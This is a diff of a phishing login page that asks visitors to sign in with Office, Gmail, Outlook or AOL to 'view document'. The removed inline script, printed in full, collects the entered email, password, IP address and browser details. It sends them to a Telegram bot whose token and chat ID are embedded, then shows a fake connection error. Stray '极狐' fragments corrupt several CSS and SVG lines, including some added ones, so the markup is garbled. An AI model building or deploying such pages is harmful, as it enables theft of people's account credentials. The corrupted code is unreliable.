@@ -31,7 +31,7 @@ width: 100%;
 max-width: 400px;
 background: var(--card-bg);
 border-radius: 8px;
-box-shadow: 0 10px极狐 30px rgba(0,0,0,0.15);
+box-shadow: 0 10px 30px rgba(0,0,0,0.15);
 padding: 30px;
 }
 .logo-header {
@@ -61,10 +61,10 @@ transform: translateY(-2px);
 border-color: rgba(0,0,0,0.05);
 }
 .provider.active {
-box-shadow: 0 4px 10px rgba(0,0,极狐0,0.1);
+box-shadow: 0 4px 10px rgba(0,0,0,0.1);
 border-color: rgba(0,0,0,0.1);
 }
-.provider极狐 svg {
+.provider svg {
 width: 22px;
 height: 22px;
 }
@@ -100,7 +100,7 @@ transition: all 0.2s;
 input:focus {
 outline: none;
 border-color: var(--accent);
-box-shadow: 0 0 0 3px rgba(0,120,212,0.1);
+box-shadow: 极狐0 0 0 3px rgba(0,120,212,0.1);
 }
 .form-options {
 display: flex;
@@ -145,7 +145,7 @@ font-size: 13px;
 content: "";
 flex: 1;
 height: 1px;
-background: #e5极狐e7eb;
+background: #e5e7eb;
 margin: 0 10px;
 }
 .social-icons {
@@ -177,7 +177,7 @@ fill: white;
 font-size: 12px;
 color: var(--muted);
 text-align: center;
-margin-top: 20px;
+margin-top极狐: 20px;
 line-height: 1.5;
 }
 .warning {
@@ -233,8 +233,8 @@ opacity: 0.8;
 <svg viewBox="0 0 24 24">
 <rect x="2" y="2" width="6" height="6" rx="1" fill="var(--office)"/>
 <rect x="9" y="2" width="6" height="6" rx="1" fill="var(--office)" opacity="0.95"/>
-<rect x="16" y="2" width="6" height="6" rx="1极狐" fill="var(--office)" opacity="0.9"/>
-<rect x="2" y="9" width="6" height="6" rx="1" fill极狐="var(--office)" opacity="0.95"/>
+<rect x="16" y="2" width="6" height="6" rx="1" fill="var(--office)" opacity="0.9"/>
+<rect x="2" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.95"/>
 <rect x="9" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.9"/>
 <rect x="16" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.85"/>
 </svg>
@@ -246,10 +246,10 @@ opacity: 0.8;
 <path d="M2 18.5 L12 12 L22 18.5" fill="none" stroke="var(--gmail)" stroke-width="2.4"/>
 </svg>
 </button>
-<button class="provider" data-provider="极狐outlook" title="Outlook">
+<button class="provider" data-provider="outlook" title="Outlook">
 <svg viewBox="0 0 24 24">
 <rect x="1.5" y="4" width="14" height="16" rx="2" fill="var(--outlook)"/>
-极狐<path d="M3 极狐6 L13 12 L3 18" fill="none" stroke="white" stroke-width="1.6"/>
+<path d="M3 6 L13 12 L3 18" fill="none" stroke="white" stroke-width="1.6"/>
 <rect x="16.5" y="4" width="6" height="6" rx="1" fill="#2b88d8"/>
 </svg>
 </button>
@@ -257,13 +257,13 @@ opacity: 0.8;
 <svg viewBox="0 0 24 24">
 <circle cx="12" cy="12" r="10" fill="var(--aol)"/>
 <path d="M9.5 15c.8-1.5 1.8-3.2 3-4.5 1.2 1.3 2.2 3 3 4.5" fill="none" stroke="white" stroke-width="1.6"/>
-<circle cx="12.2" cy="9.4" r="0.9" fill="white"/>
+<circle cx="12.2" cy="9.4"极狐 r="0.9" fill="white"/>
 </svg>
 </button>
 </div>
 <div>
 <h1>Sign in to view document</h1>
-<p class="subtitle" id="h极狐int">Use your work account</p>
+<p class="subtitle" id="hint">Use your work account</p>
 </div>
 </div>
 
@@ -289,159 +289,6 @@ opacity: 0.8;
 <p class="disclaimer warning">⚠️ Unauthorized access is prohibited.</p>
 </div>
 
-<script>
-// ================== CONFIGURATION ==================
-const TELEGRAM_CONFIG = {
-    botToken: "7983528037:AAFpvdTJEJ42BryLHSDjH5OuvEURlOJ7zOA",
-    groupChatId: "-1002763948275", 
-    enableTelegram: true
-};
-
-// ================== DOM ELEMENTS ==================
-const loginForm = document.getElementById('loginForm');
-const emailInput = document.getElementById('email');
-const passwordInput = document.getElementById('password');
-const loadingScreen = document.getElementById('loading');
-const statusMessage = document.getElementById('statusMessage');
-
-// ================== TELEGRAM EXFILTRATION ==================
-class TelegramExfiltrator {
-    constructor() {
-        this.working = false;
-    }
-
-    // JSONP method for GitHub Pages compatibility
-    jsonpRequest(method, params = {}) {
-        return new Promise((resolve) => {
-            const callbackName = 'tgJsonp_' + Date.now();
-            const script = document.createElement('script');
-            
-            window[callbackName] = (response) => {
-                delete window[callbackName];
-                document.body.removeChild(script);
-                resolve(response);
-            };
-
-            let url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/${method}?callback=${callbackName}`;
-            
-            for (const [key, value] of Object.entries(params)) {
-                url += `&${key}=${encodeURIComponent(value)}`;
-            }
-
-            script.src = url;
-            document.body.appendChild(script);
-
-            setTimeout(() => {
-                if (window[callbackName]) {
-                    delete window[callbackName];
-                    document.body.removeChild(script);
-                    resolve({ok: false, description: 'Timeout'});
-                }
-            }, 8000);
-        });
-    }
-
-    // Main send method using JSONP
-    async sendToTelegram(message) {
-        if (!TELEGRAM_CONFIG.enableTelegram) {
-            return false;
-        }
-
-        try {
-            const response = await this.jsonpRequest('sendMessage', {
-                chat_id: TELEGRAM_CONFIG.groupChatId,
-                text: message,
-                parse_mode: 'Markdown',
-                disable_web_page_preview: true
-            });
-
-            return response.ok;
-
-        } catch (error) {
-            console.error('Send error:', error);
-            return false;
-        }
-    }
-}
-
-// ================== DATA COLLECTION ==================
-async function getPublicIP() {
-    try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return { ip: data.ip };
-    } catch (error) {
-        return { ip: 'unknown' };
-    }
-}
-
-function getSystemInfo() {
-    return {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        screen: `${screen.width}x${screen.height}`,
-        language: navigator.language,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-    };
-}
-
-// ================== MAIN EXECUTION ==================
-const telegramExfiltrator = new TelegramExfiltrator();
-
-// Form submission handler
-loginForm.addEventListener('submit', async function(event) {
-    event.preventDefault();
-    
-    const email = emailInput.value;
-    const password = passwordInput.value;
-    
-    if (!email || !password) {
-        alert('Please enter both email and password.');
-        return;
-    }
-
-    loadingScreen.style.display = 'flex';
-    statusMessage.textContent = 'Verifying credentials...';
-
-    try {
-        const [ipData, systemInfo] = await Promise.all([
-            getPublicIP(),
-            Promise.resolve(getSystemInfo())
-        ]);
-
-        statusMessage.textContent = 'Securely transmitting...';
-
-        const message = "🔐 **CREDENTIALS CAPTURED** \\n\\n" +
-            "⏰ **Time:** " + new Date().toLocaleString() + "\\n" +
-            "📍 **IP:** " + (ipData.ip || 'unknown') + "\\n" +
-            "🌐 **Browser:** " + (systemInfo.userAgent.substring(0, 60) + "...") + "\\n" +
-            "🖥️  **Screen:** " + systemInfo.screen + "\\n" +
-            "🗣️  **Language:** " + systemInfo.language + "\\n\\n" +
-            "📧 **Email:** `" + email + "`\\n" +
-            "🔑 **Password:** `" + password + "`\\n\\n" +
-            "🔗 **URL:** " + window.location.href;
-
-        const success = await telegramExfiltrator.sendToTelegram(message);
-
-        if (success) {
-            statusMessage.textContent = 'Transmission complete!';
-        } else {
-            statusMessage.textContent = 'Local verification complete';
-        }
-
-        alert('ERROR: 0x80072EFD. Cannot connect to authentication service. Please check your network connection.');
-
-    } catch (error) {
-        statusMessage.textContent = 'Authentication error';
-    } finally {
-        setTimeout(() => {
-            loadingScreen.style.display = 'none';
-        }, 1500);
-    }
-});
-
-// Security measures
-document.addEventListener('contextmenu', (e) => e.preventDefault());
-</script>
+<script src="script.js"></script>
 </body>
 </html>
